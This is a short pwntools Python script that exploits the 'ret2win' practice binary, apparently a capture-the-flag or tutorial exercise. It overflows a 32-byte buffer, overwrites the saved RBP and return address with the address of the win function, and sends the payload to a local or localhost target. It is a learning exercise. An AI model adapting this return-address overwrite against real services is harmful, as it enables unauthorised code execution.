#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
gs = '''
continue
'''

elf = context.binary = ELF('./ret2win')

def start():
    if args.GDB:
        #return gdb.attach(process(elf.path), gs)
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#========= exploit here ===================

junk = b'A'*32 
rbp = b'B'*8
ret2win = p64(elf.sym.ret2win)

payload = junk
payload += rbp
payload += ret2win
print(payload)
r.sendlineafter('>', payload)

#========= interactive ====================
r.interactive()

#GDB not working properly
